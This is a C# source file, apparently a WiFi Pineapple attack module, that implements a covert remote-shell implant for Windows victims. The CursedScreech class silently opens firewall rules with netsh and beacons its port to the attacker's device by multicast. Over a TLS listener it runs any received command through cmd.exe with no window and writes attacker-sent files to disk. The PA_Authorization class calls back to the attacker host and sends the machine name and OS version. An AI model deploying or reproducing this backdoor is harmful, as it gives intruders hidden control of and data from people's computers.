using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PineappleModules
{
    /*
     * 
     * Class:   CursedScreech
     * Author:  sud0nick
     * Created: March 3, 2016
     * Updated: September 17, 2016
     * 
     * A class that sets up a multicast thread to broadcast back
     * to the Pineapple on which port it is listening, sets up a
     * server thread for executing remote shell commands secured via
     * TLS 1.2, and establishes firewall rules to perform said actions
     * unbeknownst to the target.
     * 
    */
    public class CursedScreech
    {
        // ==================================================
        //                 CLASS ATTRIBUTES
        // ==================================================
        private SslStream sslStream;
        private string msg = "";
        private int lport = 0;
        private static string certSerial = "";
        private static string certHash = "";
        private string command = "";
        private Boolean recvFile = false;
        private byte[] fileBytes;
        private int fileBytesLeftToRead = 0;
        private string fileName = "";
        private string storeDir = "";
        private readonly string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        private readonly string exeName = Path.GetFileNameWithoutExtension(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);

        // ==================================================
        //            CURSED SCREECH INITIALIZER
        // ==================================================
	    public CursedScreech() {

            // Get the current path and name of the executable to set up rules for it in the firewall
            string addTCPRule = "netsh advfirewall firewall add rule name=\"" + exeName + "\" program=\"" + exePath + "\" protocol=TCP dir=in localport=xxxxx action=allow";
            string delFirewallRule = "netsh advfirewall firewall delete rule name=\"" + exeName + "\"";

            // Generate a random port on which to listen for commands from Kuro
            Random rnd = new Random();
            lport = rnd.Next(10000, 65534);

            // Delete old firewall rules
            exec(delFirewallRule);

            // Add new firewall rule
            exec(addTCPRule.Replace("xxxxx", lport.ToString()));
        }

        // ===========================================================
        //   OPTIONAL METHODS TO SET EXPECTED CERTIFICATE PROPERTIES
        // ===========================================================
        public void setRemoteCertificateHash(string hash) {
            certHash = hash;
        }

        public void setRemoteCertificateSerial(string serial) {
            certSerial = serial;
        }

        // ==================================================
        //        METHOD TO START THE MULTICAST THREAD
        // ==================================================
        public void startMulticaster(string address, int port, int heartbeatInterval = 5) {
            string addUDPRule = "netsh advfirewall firewall add rule name=\"" + exeName + "\" program=\"" + exePath + "\" protocol=UDP dir=out localport=" + port + " action=allow";
            exec(addUDPRule);
            new Thread(() => {
                
                UdpClient udpclient = new UdpClient(port);
                IPAddress mcastAddr = IPAddress.Parse(address);
                udpclient.JoinMulticastGroup(mcastAddr);
                IPEndPoint kuro = new IPEndPoint(mcastAddr, port);
                
                while (true) {
                    Byte[] buffer = null;
                    string localIP = localAddress();
                    if (localIP.Length == 0) {
                        localIP = "0.0.0.0";
                    }

                    // If a message is available to be sent then do so
                    if (msg.Length > 0) {
                        msg = "msg:" + msg;

                        buffer = Encoding.ASCII.GetBytes(msg);
                        udpclient.Send(buffer, buffer.Length, kuro);
                        msg = "";
                    }

                    // Send the listening socket information to Kuro
                    buffer = Encoding.ASCII.GetBytes(localIP + ":" + lport.ToString());
                    udpclient.Send(buffer, buffer.Length, kuro);
                    //Console.WriteLine("Sent heartbeat to Kuro");

                    // Sleep for however long the heartbeat interval is set
                    Thread.Sleep(heartbeatInterval * 1000);
                }
            }).Start();
        }

        // ====================================================
        //  MULTITHREADED SECURE LISTENER WITH SHELL EXECUTION
        // ====================================================
        public void startSecureServerThread(string key, string keyPassword) {
            new Thread(() => startSecureServer(key, keyPassword)).Start();
	    }

        // ====================================================
        //               BLOCKING SECURE SERVER
        // ====================================================
        public void startSecureServer(string key, string keyPassword) {

            // Create a socket for the listener
            IPAddress ipAddress = IPAddress.Parse("0.0.0.0");
            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, lport);
            TcpListener listener = new TcpListener(localEndPoint);

            // Read the certificate information from file.  This should be a .pfx container
            // with a private and public key so we can be verified by Kuro
            X509Certificate2 csKey = loadKeys(key, keyPassword);

            // Tell the thread to operate in the background
            Thread.CurrentThread.IsBackground = true;

            bool connected = false;
            TcpClient client = new TcpClient();
            Int32 numBytesRecvd = 0;
            try {

                // Start listening
                listener.Start();

                while (true) {
                    // Begin listening for connections
                    client = listener.AcceptTcpClient();

                    try {
                        this.sslStream = new SslStream(client.GetStream(), false, atkCertValidation);
                        this.sslStream.AuthenticateAsServer(csKey, true, (SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls), false);

                        connected = true;
                        while (connected) {
                            byte[] cmdRecvd = new Byte[4096];

                            numBytesRecvd = this.sslStream.Read(cmdRecvd, 0, cmdRecvd.Length);

                            if (numBytesRecvd < 1) {
                                connected = false;
                                client.Close();
                                break;
                            }

                            // If a file is being received we don't want to decode the data because we
                            // need to store the raw bytes of the file
                            if (this.recvFile) {

                                int numBytesToCopy = cmdRecvd.Length;
                                if (this.fileBytesLeftToRead < cmdRecvd.Length) {
                                    numBytesToCopy = this.fileBytesLeftToRead;
                                }

                                // Append the received bytes to the fileBytes array
                                System.Buffer.BlockCopy(cmdRecvd, 0, this.fileBytes, (this.fileBytes.Length - this.fileBytesLeftToRead), numBytesToCopy);
                                this.fileBytesLeftToRead -= numBytesRecvd;

                                // If we have finished reading the file, store it on the system
                                if (this.fileBytesLeftToRead < 1) {

                                    // Let the system know we've received the whole file
                                    this.recvFile = false;

                                    // Store the file on the system
                                    storeFile(this.storeDir, this.fileName, this.fileBytes);
                                    
                                    // Clear the fileName and fileBytes variables
                                    this.fileName = "";
                                    this.fileBytes = new Byte[1];
                                }

                            } else {
                                // Assign the decrytped message to the command string
                                this.command = Encoding.ASCII.GetString(cmdRecvd, 0, numBytesRecvd);

                                Thread shellThread = new Thread(() => sendMsg());
                                shellThread.Start();
                            }
                        }
                    }
                    catch (Exception) {
                        connected = false;
                        client.Close();
                        break;
                    }
                }
            }
            catch (Exception) { }
        }

        // ==================================================
        //            METHOD TO SEND DATA TO KURO
        // ==================================================
        private void sendMsg() {
            string msg = this.command;
            this.command = "";

            // Check if we are about to receive a file and prepare
            // the appropriate variables to receive it
            // Msg format is sendfile:fileName:byteArraySize
            if (msg.Contains("sendfile;")) {

                this.recvFile = true;
                string[] msgParts = msg.Split(';');
                this.fileName = msgParts[1];
                this.fileBytesLeftToRead = Int32.Parse(msgParts[2]);
                this.storeDir = msgParts[3];
                this.fileBytes = new Byte[this.fileBytesLeftToRead];

            } else {

                // If we are not expecting a file we simply execute
                // the received command in the shell and return the results
                string ret = exec(msg);
                if (ret.Length > 0) {
                    byte[] retMsg = Encoding.ASCII.GetBytes(ret);
                    this.sslStream.Write(retMsg, 0, retMsg.Length);
                }
            }
        }

        // ==================================================
        //         METHOD TO GET THE LOCAL IP ADDRESS
        // ==================================================
        private string localAddress() {
            IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList) {
                if (ip.AddressFamily == AddressFamily.InterNetwork) {
                    return ip.ToString();
                }
            }
            return "";
        }

        // ==================================================
        //         METHOD TO EXECUTE A SHELL COMMAND
        // ==================================================
        private static string exec(string args) {
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + args;
            proc.StartInfo = startInfo;
            proc.Start();
            proc.WaitForExit(2000);
            return proc.StandardOutput.ReadToEnd();
        }

        // ==================================================
        //          METHOD TO STORE A RECEIVED FILE 
        // ==================================================
        private void storeFile(string dir, string name, byte[] file) {
            // If the directory doesn't exist, create it
            Directory.CreateDirectory(dir);

            // Write the file out to the directory
            File.WriteAllBytes(dir + name, file);

            // Tell Kuro the file was stored
            byte[] retMsg = Encoding.ASCII.GetBytes("Received and stored file " + name + " in directory " + dir);
            this.sslStream.Write(retMsg, 0, retMsg.Length);
        }

        // ==================================================
        //           METHOD TO LOAD KEYS FROM A PFX
        // ==================================================
        private X509Certificate2 loadKeys(string key, string password) {
            var certStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(key);
            byte[] bytes = new byte[certStream.Length];
            certStream.Read(bytes, 0, bytes.Length);
            return new X509Certificate2(bytes, password);
        }

        // ==================================================
        //        METHOD TO VERIFY KURO'S CERTIFICATE
        // ==================================================
        private static bool atkCertValidation(Object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) {
            //Console.WriteLine(BitConverter.ToString(cert.GetSerialNumber()));
            //Console.WriteLine(cert.GetCertHashString());
            if (certSerial != "") {
                if (BitConverter.ToString(cert.GetSerialNumber()) != certSerial) { return false; }
            }
            if (certHash != "") {
                if (cert.GetCertHashString() != certHash) { return false; }
            }
            if (sslPolicyErrors == SslPolicyErrors.None) { return true; }
            if (sslPolicyErrors == SslPolicyErrors.RemoteCertificateChainErrors) { return true; }
            return false;
        }
    }



    /*
     * 
     * Class:   PA_Authorization
     * Author:  sud0nick
     * Date:    July 16, 2016
     * 
     * A class for interacting with Portal Auth Shell Server
     * This class simply connects back to the PASS script on
     * the Pineapple, supplies some system info, and retrieves
     * an access key for the victim to log on to the portal.
     * 
    */

    public class PA_Authorization {
        private string rHost;
        private int rPort;
        private string accessKey = "";

        public PA_Authorization(string remoteHost = "172.16.42.1", int remotePort = 4443) {
            rHost = remoteHost;
            rPort = remotePort;
        }

        public string getAccessKey() {
            // Establish a new socket to connect back to the Pineapple
            TcpClient c_bk = new TcpClient();

            try {
                c_bk.Connect(rHost, rPort);
            }
            catch {
                return "";
            }
            
            
            NetworkStream pa_stream = c_bk.GetStream();

            // Send system information to PortalAuth
            string systemInfo = "0;" + System.Environment.MachineName + ";" + System.Environment.OSVersion;
            byte[] sysinfo = Encoding.ASCII.GetBytes(systemInfo);
            pa_stream.Write(sysinfo, 0, sysinfo.Length);

            // Get the access key back from PortalAuth
            byte[] msgRecvd = new Byte[1024];
            Int32 bytesRecvd = 0;
            bytesRecvd = pa_stream.Read(msgRecvd, 0, msgRecvd.Length);

            if (bytesRecvd < 1) {
                c_bk.Close();
                return "";
            }
            else {
                accessKey = Encoding.ASCII.GetString(msgRecvd, 0, bytesRecvd);
            }

            // Close the connection
            c_bk.Close();

            // Return accessKey with either an error message or the key that was received
            return accessKey;
        }
    }
}
